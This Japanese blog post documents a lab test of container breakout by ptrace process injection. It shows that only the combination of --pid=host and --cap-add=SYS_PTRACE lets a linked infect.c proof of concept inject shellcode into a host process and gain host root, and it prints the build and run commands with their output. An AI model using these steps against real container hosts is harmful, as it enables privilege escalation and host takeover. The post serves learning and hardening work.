<div style="text-align:center;">[f:id:motikan2010:20230606091225p:plain:w600]</div>

<div class="contents-box"><p>[:contents]</p></div>

## はじめに

　先日、やられアプリ「AWSGoat」を紹介しましたが、その中にプロセス・インジェクション攻撃を利用した「コンテナからの脱獄（Container Breakout）」の流れがありました。  

<figure class="figure-image figure-image-fotolife" title="「プロセス・インジェクション」のイメージ図">[f:id:motikan2010:20230606123455p:plain:w400]<figcaption>「プロセス・インジェクション」のイメージ図</figcaption></figure>


　コンテナ起動時のコマンド(`docker run`)にどのオプションを付与した場合にこの攻撃が成立するのかを確認する為、実際に脆弱なコンテナを動作させて確認しました。  

[https://blog.motikan2010.com/entry/2023/05/31/%E3%82%84%E3%82%89%E3%82%8CAWS%E7%92%B0%E5%A2%83%E3%80%8CAWSGoat%E3%80%8D%E3%81%A7%E3%83%9A%E3%83%B3%E3%83%86%E3%82%B9%E3%83%88%E3%82%92%E5%AD%A6%E7%BF%92:embed:cite]

## 検証するオプション

　本記事では２つの「`docker run`」コマンドに付与するオプションの有無によっての動作の違いを確認していきます。  

- 「--pid」オプション
- 「--cap-add」オプション

　この２つのオプションについて簡単に説明します。  

### 「--pid」オプション

| オプション | 説明 |
| - | - |
| --pid | コンテナに対する PID（プロセス）名前空間モードを指定 |

指定例：

<div class="md-code" style="width:100%">

```
--pid='container:<名前 | コンテナ ID>'  : 他のコンテナの PID 名前空間に参加
      'host'  : コンテナ内でホスト環境の PID 名前空間を使用
```

</div>

　デフォルトでは全てのコンテナで「PID 名前空間（PID namespace）」は有効な状態です。

　「`--pid=host`」オプションを指定することで、ホスト環境のPID 名前空間が共有されます。

　<span class="m-y">ホスト環境のPID 名前空間が共有されることにより、コンテナ内からホスト環境のプロセスに対してアクセスが可能になります。</span>

[https://docs.docker.jp/engine/reference/run.html#pid-pid:title]  

### 「--cap-add」オプション

　コンテナ上のrootユーザに対して許可する権限（ケイパビリティ）を追加するオプションです。  

| オプション | 説明 |
| - | - |
| --cap-add | Linux ケイパビリティの追加 |

<div class="md-code" style="width:100%">

```
--cap-add='<ケイパビリティキー>'  : コンテナに追加するケイパビリティ
```

</div>

　デフォルトではコンテナ上のrootユーザには一部のケイパビリティのみが付与されています。  
そのためコンテナ上のrootユーザには多くの制限があります。  

　以下にコンテナがデフォルトで保持しているケイパビリティと追加可能なケイパビリティが記載されています。  
[https://docs.docker.jp/engine/reference/run.html#runtime-privilege-linux-capabilities:title]

　本検証では「CAP_SYS_PTRACE」ケイパビリティの有無によっての動作の違いを確認していきます。    

　「`--cap-add=SYS_PTRACE`」オプションを指定することで、「CAP_SYS_PTRACE」ケイパビリティが追加された状態でコンテナが起動されます。

　<span class="m-y">「CAP_SYS_PTRACE」ケイパビリティを追加することにより、コンテナ内で「ptrace() システムコール」が利用可能になります。</span>  

　<span class="m-y">「ptrace() システムコール」を使うことで別プロセスの制御が可能になります。プロセスのメモリにシェルコードを書き込むことも可能です。</span>

[https://itchyny.hatenablog.com/entry/2017/07/31/090000:title]

## 検証環境

　検証環境のOSとDockerバージョンは以下の通りです。  

<div class="md-code" style="width:100%">

```
# uname -a
Linux ip-172-31-33-251.ap-northeast-1.compute.internal 6.1.27-43.48.amzn2023.x86_64 #1 SMP PREEMPT_DYNAMIC Tue May  2 04:53:36 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

# docker --version
Docker version 20.10.23, build 7155243
```

</div>


　本記事で利用したコンテナイメージや攻撃PoCは以下のリポジトリにあります。  

[https://github.com/motikan2010/Container-Breakout-Learning:embed:cite]


## 検証内容

　２オプションの有効時・無効時の挙動を確認するため、４パターンを試しています。  

| 設定パターン | --pid=host | --cap-add=SYS_PTRACE |
| - |: - :|: - :|
| パターン① | - | - |
| パターン② | **有効** | - |
| パターン③ | - | **有効** |
| パターン④ | **有効** | **有効** |

### 準備

　脱獄対象のコンテナを起動する前に、プロセス・インジェクション攻撃の対象となるプロセスを起動します。  

　Pythonでポート10080番で待ち受けるHTTPサーバを起動します。このPID 「74067」のプロセスが攻撃対象を攻撃対象です。  

<div class="md-code" style="width:100%">

```
【ホスト環境】
# python3 -m http.server 10080 &

-- プロセスの確認
# ps au
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root        2130  0.0  0.0 221344  1084 tty1     Ss+  11:28   0:00 /sbin/agetty -o -p -- \u --noclear - linux
root        2131  0.0  0.0 221388  1084 ttyS0    Ss+  11:28   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,57600,38400,9600 - vt220
ec2-user   72976  0.0  0.2 233060  5004 pts/1    Ss   14:29   0:00 -bash
root       72999  0.0  0.4 260292  8276 pts/1    S    14:29   0:00 sudo su -
root       73001  0.0  0.2 245536  4712 pts/1    S    14:29   0:00 su -
root       73002  0.0  0.2 233188  5100 pts/1    S    14:29   0:00 -bash
👇 このプロセスに対してプロセス・インジェクションを実施
root       74067  0.0  0.9 241204 18056 pts/1    S    14:31   0:00 /root/.pyenv/versions/3.9.16/bin/python3 -m http.server 10080
root       78647  0.0  0.1 232520  2776 pts/1    R+   14:46   0:00 ps au
```

</div>


　攻撃コードはこちらです。  
[https://github.com/motikan2010/Container-Breakout-Learning/blob/main/poc/infect.c:title]
（参考コード： <span><a href="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c" target="_blank">https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</a></span>）


　このコードをビルド（`gcc infect.c -o infect`）した後、「`./infect 74067`」のようにPIDを引数に渡して実行することでプロセス・インジェクション攻撃を行うことができます。  

## 検証開始

　検証に用いているDocker環境は Docker Compose で制御しており、「`docker-compose.yml`」ファイルでオプション（「`--pid=host`」と「`-cap-add=SYS_PTRACE`」）の設定を行っています。  
（無効化するオプションはコメントアウトしてください。）  

<div class="md-code" style="width:100%">

```yaml
version: "3.8"

services:
  app:
    build:
      context: .
      dockerfile: ./Dockerfile
    volumes:
      - ./poc:/usr/poc/
    working_dir: /usr/poc/
    pid: "host"     # ⭐️ PID
    cap_add:        # ⭐️ Capabilities
      - SYS_PTRACE
    tty: true
```

</div>


　コンテナを起動後、コンテナ内でコマンド実行できるようにシェルを起動します。  

<div class="md-code" style="width:50%">

```
【ホスト環境】
-- コンテナ起動
# make up

-- コンテナのbashを起動
# make app
```

</div>

　このシェル上で「ホスト環境のプロセスが確認可否」や「攻撃の成否」などを確認します。    

### パターン①（オプションなし）

　まずはどちらのオプションも指定されていない状態です。  
　一般的にコンテナを起動する場合はこのパターンになると考えられます。  

| オプション | |
| - | - |
| --pid=host | なし |
| --cap-add=SYS_PTRACE | なし |

　プロセスを確認します。**コンテナ内のプロセスのみが表示**されています。  
<div class="md-code" style="width:100%">
```
【コンテナ環境】
root@b1e9750ed68c:/usr/poc# ps a
    PID TTY      STAT   TIME COMMAND
      1 pts/0    Ss+    0:00 bash
      7 pts/1    Ss     0:00 bash
     13 pts/1    R+     0:00 ps a
```

</div>

<br>
　ケイパビリティを確認してみます。「SYS_PTRACE」は見当たりません。
<div class="md-code" style="width:100%">

```
【コンテナ環境】
root@b1e9750ed68c:/usr/poc# capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

</div>

　ホスト環境のプロセスを確認することはできませんでしたが、PIDを指定してプロセス・インジェクション攻撃を実行してみます。  　
<div class="md-code" style="width:100%">

```
【コンテナ環境】
root@b1e9750ed68c:/usr/poc# ./infect 74067
+ Tracing process 74067
ptrace(ATTACH):: No such process
```

</div>

　想定通り、攻撃は失敗しました。  

　「`ptrace(ATTACH):: No such process`」というエラーメッセージからホスト環境のプロセスに対してアクセスが失敗していることが分かります。これはプロセス名前空間がホスト環境とコンテナ環境で隔離されているのが原因です。  

### パターン②（--pid=host）

　今度はホスト環境のプロセスにアクセスできる状態です。

| オプション | |
| - | - |
| --pid=host | **あり** |
| --cap-add=SYS_PTRACE | なし |

　プロセスを確認します。  

　パターン①と異なり<span class="m-y">コンテナ環境外のプロセスが表示され、ホスト環境のプロセスにアクセスできていることが確認できます。</span>  

<div class="md-code" style="width:100%">

```
【コンテナ環境】
root@f71f748ca3c7:/usr/poc# ps a
    PID TTY      STAT   TIME COMMAND
   2130 ?        Ss+    0:00 /sbin/agetty -o -p -- \u --noclear - linux
   2131 ?        Ss+    0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,57600,38400,9600 - vt220
  72976 pts/1    Ss     0:00 -bash
  72999 pts/1    S      0:00 sudo su -
  73001 pts/1    S      0:00 su -
  73002 pts/1    S      0:00 -bash
  74067 pts/1    S      0:00 /root/.pyenv/versions/3.9.16/bin/python3 -m http.server 10080
  76982 pts/0    Ss+    0:00 bash
  77229 pts/1    S+     0:00 make app
  77230 pts/1    Sl+    0:00 docker-compose exec app bash
  77246 pts/1    Ss     0:00 bash
  77254 pts/1    R+     0:00 ps a
```

</div>

<br>
　ケイパビリティを確認してみます。「SYS_PTRACE」は見当たりません。
<div class="md-code" style="width:100%">

```
【コンテナ環境】
root@f71f748ca3c7:/usr/poc# capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

</div>

　プロセス・インジェクション攻撃を実行してみます。

<div class="md-code" style="width:100%">

```
【コンテナ環境】
root@f71f748ca3c7:/usr/poc# ./infect 74067
+ Tracing process 74067
ptrace(ATTACH):: Operation not permitted
```

</div>

　エラーとなりましたが、パターン①の時とエラーメッセージが異なっています。  

　「`ptrace(ATTACH):: Operation not permitted`」というエラーメッセージはコンテナ環境のケイパビリティが不足しており「ptrace() システムコール」の実行権限がないことを表しています。  

[https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities:title]

　このパターン②で<span class="m-y">ホスト環境のプロセスにアクセスできた場合でも「ptrace() システムコール」が実行できないとプロセス・インジェクション攻撃は失敗する</span>ということが確認できました。  

### パターン③（--cap-add=SYS_PTRACE）

　「ptrace() システムコール」は実行できるが、ホスト環境のプロセスにアクセスできない状態です。  

| オプション | |
| - | - |
| --pid=host | なし |
| --cap-add=SYS_PTRACE | **あり** |


　プロセスを確認します。パターン①同様、**コンテナ内のプロセスのみが表示**されています。  
<div class="md-code" style="width:100%">

```
【コンテナ環境】
root@37ae5c031be6:/usr/poc# ps a
    PID TTY      STAT   TIME COMMAND
      1 pts/0    Ss+    0:00 bash
      7 pts/1    Ss     0:00 bash
     13 pts/1    R+     0:00 ps a
```

</div>

<br>
　ケイパビリティを確認してみます。「`cap_sys_ptrace`」が出力に含まれており「CAP_SYS_PTRACE」が追加されています。  
　これで「ptrace() システムコール」も実行できるコンテナ環境となっています。

<div class="md-code" style="width:100%">

```
【コンテナ環境】
root@37ae5c031be6:/usr/poc# capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

</div>

　プロセス・インジェクション攻撃を実行してみます。
<div class="md-code" style="width:100%">

```
【コンテナ環境】
root@3241904b2741:/usr/poc# ./infect 74067
+ Tracing process 74067
ptrace(ATTACH):: No such process
```

</div>

　パターン① と同じエラーメッセージが表示されました。失敗原因も同様でホスト環境のプロセスに対してアクセスが失敗しているようです。

　これで<span class="m-y">コンテナ環境で「ptrace() システムコール」が実行できた場合でも、ホスト環境のプロセスにアクセスできないと攻撃が失敗する</span>ことが確認できました。  

### パターン④（--pid=host と --cap-add=SYS_PTRACE）

　最後はホスト環境のプロセスにアクセスできるかつ、「ptrace() システムコール」が実行できる状態です。  

| オプション | |
| - | - |
| --pid=host | **あり** |
| --cap-add=SYS_PTRACE | **あり** |

　　プロセスを確認します。<span class="m-y">ホスト環境のプロセスにアクセスできています。</span>  
<div class="md-code" style="width:100%">

```
【コンテナ環境】
root@b9ceb8fb7c89:/usr/poc# ps a
    PID TTY      STAT   TIME COMMAND
   2130 ?        Ss+    0:00 /sbin/agetty -o -p -- \u --noclear - linux
   2131 ?        Ss+    0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,57600,38400,9600 - vt220
   2401 pts/0    Ss     0:00 -bash
   2424 pts/0    S      0:00 sudo su -
   2426 pts/0    S      0:00 su -
   2427 pts/0    S+     0:00 -bash
  65349 pts/0    T      0:00
  66006 pts/0    Ss+    0:00 bash
  72976 pts/1    Ss     0:00 -bash
  72999 pts/1    S      0:00 sudo su -
  73001 pts/1    S      0:00 su -
  73002 pts/1    S      0:00 -bash
  74067 pts/1    S      0:00 /root/.pyenv/versions/3.9.16/bin/python3 -m http.server 10080
  74440 pts/1    S+     0:00 make app
  74441 pts/1    Sl+    0:00 docker-compose exec app bash
  74457 pts/1    Ss     0:00 bash
  74464 pts/1    R+     0:00 ps a
```

</div>

　ケイパビリティを確認します。<span class="m-y">「cap_sys_ptrace」が出力に含まれており「CAP_SYS_PTRACE」が追加されています。</span>  

<div class="md-code" style="width:100%">

```
【コンテナ環境】
root@b9ceb8fb7c89:/usr/poc# capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

</div>

　このコンテナ環境は「ホスト環境のプロセスにアクセス可能」かつ「ptrace() システムコールが実行可能」です。
　
　では、　プロセス・インジェクション攻撃を実行してみます。
<div class="md-code" style="width:100%">

```
【コンテナ環境】
root@aa6559b6c94d:/usr/poc# ./infect 74067
+ Tracing process 74067
+ Waiting for process...
+ Getting Registers
+ Injecting shell code at 0x7f55f4d42987
+ Setting instruction pointer to 0x7f55f4d42989
+ Run it!

id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

docker --version
Docker version 20.10.23, build 7155243
```

</div>

　<span class="m-y">攻撃は成功し、本来の目的であるホスト環境のroot権限を取得することができました。</span>

## まとめ

　以上、４パターンの結果をまとめると以下のようになります。  

| 設定パターン | --pid=host | --cap-add=SYS_PTRACE | 脱獄（Container Breakout） |
| - |: - :|: - :|: - :|
| パターン① | - | - | 失敗 |
| パターン② | **有効** | - | 失敗 |
| パターン③ | - | **有効** | 失敗 |
| パターン④ | **有効** | **有効** | **成功** |

　プロセス・インジェクション攻撃を利用したコンテナからの脱獄には２つのオプションが必須であることが確認できました。  

## 参考

- Container Breakout – Part 1  
https://tbhaxor.com/container-breakout-part-1/#lab-process-injection
